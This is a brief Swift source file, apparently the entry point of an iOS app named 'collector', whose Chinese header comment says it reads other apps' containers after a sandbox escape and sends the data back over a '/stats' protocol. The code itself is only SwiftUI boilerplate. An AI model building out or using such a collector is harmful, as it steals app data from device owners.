//
//  CollectorApp.swift
//  collector — worse_query 采集端（iOS 26.0–27.2 / 27.2.1 声称支持）
//
//  用途：沙盒逃逸后读取其他 App 容器，按新v2 的 /stats 协议回传。
//  前置：App Group 已在 entitlement / provisioning 里配好（AltStore/SideStore 会自动建）。
//

import SwiftUI

@main
struct CollectorApp: App {
    var body: some Scene {
        WindowGroup { ContentView() }
    }
}
